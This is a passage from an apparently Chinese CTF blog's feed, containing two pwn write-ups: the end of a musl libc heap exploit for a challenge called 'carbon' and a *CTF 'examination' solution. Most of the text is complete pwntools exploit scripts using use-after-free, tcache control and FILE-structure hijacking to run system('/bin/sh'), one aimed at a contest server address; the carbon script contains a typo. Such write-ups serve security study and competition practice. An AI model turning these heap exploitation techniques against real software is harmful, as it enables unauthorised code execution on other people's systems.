class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./carbon&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process([&#x27;./libc.so&#x27;, &#x27;carbon&#x27;])</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;./libc.so&#x27;)</span></span><br><span class="line"><span class="comment"># r = process([&#x27;/ctf/work/download/libc.so&#x27;, &#x27;./carbon&#x27;])</span></span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/ctf/work/download/libc.so&#x27;)</span></span><br><span class="line">r = process([<span class="string">&#x27;../../libc/libc1.1.24.so&#x27;</span>, <span class="string">&#x27;./carbon&#x27;</span>])</span><br><span class="line">libc = ELF(<span class="string">&#x27;../../libc/libc1.1.24.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">option</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(option), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">size, believer, content</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What is your prefer size? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Are you a believer? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(believer)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;Say hello to your new sleeve &gt;&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What is your sleeve ID? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx, content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What is your sleeve ID? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;What is your sleeve ID? &gt;&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">create(<span class="number">0x1</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(r.recvuntil(<span class="string">b&#x27;Done.&#x27;</span>, drop=<span class="literal">True</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">0x29de61</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base=&gt;&#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">bin_addr = libc_base + <span class="number">0x29de00</span> - <span class="number">0x8</span></span><br><span class="line">stdin_addr = libc_base + libc.symbols[<span class="string">&#x27;__stdin_FILE&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">binmap_addr = libc_base + <span class="number">0x29da80</span></span><br><span class="line">brk_addr = libc_base + libc.symbols[<span class="string">&#x27;brk&#x27;</span>]</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 2</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 3</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 4</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 5</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 6</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 7</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 8</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>) + p64(<span class="number">0x21</span>) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span></span><br><span class="line">payload += p64(<span class="number">0x21</span>) + p64(<span class="number">0x20</span>) + p64(stdin_addr -</span><br><span class="line">                                       <span class="number">0x10</span>) + p64(stdin_addr -</span><br><span class="line">                                                   <span class="number">0x10</span>) + p8(<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;Y&#x27;</span>, payload + <span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(stdin_addr - <span class="number">0x10</span>, bin_addr))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 5</span></span><br><span class="line">file_struct = <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span></span><br><span class="line">file_struct += p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">1</span>) * <span class="number">2</span> + p64(system_addr)</span><br><span class="line">create(<span class="number">0x50</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 9</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(brk_addr - <span class="number">0x10</span>, brk_addr - <span class="number">0x10</span>))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 7</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(binmap_addr - <span class="number">0x10</span>, binmap_addr - <span class="number">0x10</span>))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(binmap_addr - <span class="number">0x10</span>, bin_addr))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 7</span></span><br><span class="line">create(<span class="number">0x50</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 10</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">3</span>, flat(brk_addr - <span class="number">0x10</span>, bin_addr))</span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span>)  <span class="comment"># 1</span></span><br><span class="line">create(<span class="number">0x50</span>, <span class="string">b&#x27;N&#x27;</span>, <span class="string">b&#x27;\n&#x27;</span>)  <span class="comment"># 11</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">9</span>, file_struct)</span><br><span class="line">edit(<span class="number">11</span>, p64(<span class="number">0xbadbeef</span> - <span class="number">0x20</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">edit(<span class="number">10</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x10</span> + p64(<span class="number">0</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&quot;&gt;&quot;</span>)</span><br><span class="line">r.sendlien(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;What is your prefer size? &gt;&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>然后就是我这里的libc是自己编译的和题目一直有出入，所以我这个exp可能不能直接用在题目上，同时我也问了其他师傅这个编译该怎么办，还在等回复~</p><hr><p>参考链接：<a class="link"   href="https://www.anquanke.com/post/id/202253%23h2-4#h3-14" >https://www.anquanke.com/post/id/202253%23h2-4#h3-14<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;这个月干的是属实有点儿少，感觉特别迷茫，学了那么多结果比赛还是一头雾水，虽然很烦躁但是还是不能放弃啊！&lt;/p&gt;
&lt;p&gt;在starCTF的第二道题我始终找不到漏洞点在哪，下来看wp才发现使用的libc不是普通的glibc了，其实在RCTF的一道题目就是基于musl的但是无奈g</summary>
      
    
    
    
    <category term="pwn" scheme="https://cv196082.gitee.io/categories/pwn/"/>
    
    
    <category term="musl" scheme="https://cv196082.gitee.io/tags/musl/"/>
    
  </entry>
  
  <entry>
    <title>*CTF-examination</title>
    <link href="https://cv196082.gitee.io/2022/04/17/CTF-examination/"/>
    <id>https://cv196082.gitee.io/2022/04/17/CTF-examination/</id>
    <published>2022-04-17T02:16:33.000Z</published>
    <updated>2022-04-17T03:07:10.148Z</updated>
    
    <content type="html"><![CDATA[<h2 id="examination"><a href="#examination" class="headerlink" title="examination"></a>examination</h2><p>太菜了只做了第一道题，第二道题死活找不到漏洞点</p><h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p>这道题的流程挺明确的，因为是c语言逆向起来比较简单这里就不再赘述逆向过程了。</p><p>总的来说程序就是下图所示的这个结构</p><p><img src="/images/image-20220416234427867.png" alt="image-20220416234427867"></p><p>首先就是程序存在一个可以让我们任意地址+1的函数，利用此函数造成UAF，进而泄漏出libc地址，随后继续利用UAF控制结构体的指向，进而控制tcache_struct最后使用house of pig的最后一步即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./examination&#x27;</span>)</span><br><span class="line"><span class="comment"># r = process(&#x27;./examination&#x27;)</span></span><br><span class="line">r = remote(<span class="string">&#x27;124.70.130.92&#x27;</span>, <span class="number">60001</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">choice</span>):</span></span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;choice&gt;&gt; &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(choice), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span>(<span class="params">question_num</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;enter the number of questions: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(question_num), encoding=<span class="string">&#x27;utf8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">score</span>():</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_review</span>(<span class="params">idx, comment, size=<span class="literal">None</span></span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">b&#x27;which one? &gt; &#x27;</span>, <span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;please input the size of comment: &#x27;</span>)</span><br><span class="line">        r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(size), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">    r.sendafter(<span class="string">b&#x27;enter your comment:&#x27;</span>, comment)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;which student id to choose?&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_role</span>(<span class="params">role</span>):</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;role: &lt;0.teacher/1.student&gt;: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(role), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_review</span>(<span class="params">addr=<span class="literal">None</span></span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">if</span> addr <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;add 1 to wherever you want! addr: &#x27;</span>)</span><br><span class="line">        r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(addr), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor_pray</span>():</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_mod</span>(<span class="params">score, mod=<span class="literal">None</span></span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">if</span> mod <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;enter your mode!&#x27;</span>)</span><br><span class="line">        r.send(mod)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r.recvuntil(<span class="string">b&#x27;enter your pray score: 0 to 100&#x27;</span>)</span><br><span class="line">        r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(score), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_id</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">6</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;input your id: &#x27;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">bytes</span>(<span class="built_in">str</span>(idx), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gift</span>(<span class="params">content</span>):</span></span><br><span class="line">    menu(<span class="number">6</span>)</span><br><span class="line">    r.recvuntil(<span class="string">b&#x27;never pray again!&#x27;</span>)</span><br><span class="line">    r.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">b&#x27;role: &lt;0.teacher/1.student&gt;:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">create(<span class="number">9</span>)</span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_id(<span class="number">1</span>)</span><br><span class="line">xor_pray()</span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">score()</span><br><span class="line">write_review(<span class="number">1</span>, <span class="string">b&#x27;dzhsb&#x27;</span>, <span class="number">0x350</span>)</span><br><span class="line">write_review(<span class="number">0</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">240</span> + flat(<span class="number">0x460</span>, <span class="number">0x261</span>), <span class="number">0x350</span>)</span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_id(<span class="number">1</span>)</span><br><span class="line">check_review()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;Good Job! Here is your reward! &#x27;</span>)</span><br><span class="line">chunk_base = <span class="built_in">int</span>(r.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>), base=<span class="number">16</span>) - <span class="number">0x2f0</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(chunk_base))</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;add 1 to wherever you want! addr: &#x27;</span>)</span><br><span class="line">r.send(<span class="built_in">bytes</span>(<span class="built_in">str</span>(chunk_base + <span class="number">0x339</span>), encoding=<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">create(<span class="number">1</span>)</span><br><span class="line">write_review(<span class="number">1</span>, <span class="string">b&#x27;wow&#x27;</span>, <span class="number">800</span> - <span class="number">0x20</span>)</span><br><span class="line">change_role(<span class="number">1</span>)</span><br><span class="line">change_id(<span class="number">0</span>)</span><br><span class="line">check_review()</span><br><span class="line">r.recvuntil(<span class="string">b&#x27;here is the review:\n&#x27;</span>)</span><br><span class="line">main_arena_96 = u64(r.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(main_arena_96))</span><br><span class="line">malloc_hook = (main_arena_96 &amp; <span class="number">0xFFFFFFFFFFFFF000</span>) + \</span><br><span class="line">    (libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>] &amp; <span class="number">0xfff</span>)</span><br><span class="line">libc_base = malloc_hook - libc.symbols[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"></span><br><span class="line">change_role(<span class="number">0</span>)</span><br><span class="line">create(<span class="number">9</span>)</span><br><span class="line">write_review(</span><br><span class="line">    <span class="number">0</span>, flat(chunk_base + <span class="number">0x6d0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x21</span>, <span class="number">0x1</span>, chunk_base + <span class="number">0x10</span>,</span><br><span class="line">            <span class="number">0x290</span>))</span><br><span class="line">write_review(</span><br><span class="line">    <span class="number">2</span>,</span><br><span class="line">    <span class="string">b&#x27;7&#x27;</span> * <span class="number">0xc0</span> + p64(libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>] + libc_base - <span class="number">0x10</span>) + <span class="string">b&#x27;7&#x27;</span> *</span><br><span class="line">    (<span class="number">0x200</span> - <span class="number">8</span> * <span class="number">2</span> - <span class="number">0xc0</span>) + p64(libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack_file</span>(<span class="params">_IO_write_base=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">              _IO_write_ptr=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">              _IO_buf_base=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">              _IO_buf_end=<span class="number">0</span>,</span></span></span><br><span class="line"><span class="params"><span class="function">              vtable=<span class="number">0</span></span>):</span></span><br><span class="line">    IO_FILE = p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>) + \</span><br><span class="line">        p64(_IO_write_base)+p64(_IO_write_ptr) + \</span><br><span class="line">        p64(<span class="number">0</span>)+p64(_IO_buf_base)+p64(_IO_buf_end)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xc0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    IO_FILE += p32(<span class="number">0</span>)</span><br><span class="line">    IO_FILE = IO_FILE.ljust(<span class="number">0xd8</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(vtable)</span><br><span class="line">    <span class="keyword">return</span> IO_FILE</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_IO_str_jumps = libc_base + <span class="number">0x1e9560</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">file_struct = pack_file(</span><br><span class="line">    <span class="number">1</span>, <span class="number">0xffffffffffff</span>, libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0xe0</span>,</span><br><span class="line">    libc_base + libc.symbols[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>] + <span class="number">0xe0</span> + <span class="number">0x18</span>, _IO_str_jumps)</span><br><span class="line">file_struct += <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + p64(system_addr) * <span class="number">2</span></span><br><span class="line">gift(file_struct + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r)</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p><a href="https://cv196082.gitee.io/2022/03/01/house-of-pig/">house of pig</a>源码层面分析</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;examination&quot;&gt;&lt;a href=&quot;#examination&quot; class=&quot;headerlink&quot; title=&quot;examination&quot;&gt;&lt;/a&gt;examination&lt;/h2&gt;&lt;p&gt;太菜了只做了第一道题，第二道题死活找不到漏洞点&lt;/p&gt;
&lt;h3 id</summary>
      
    
    
    
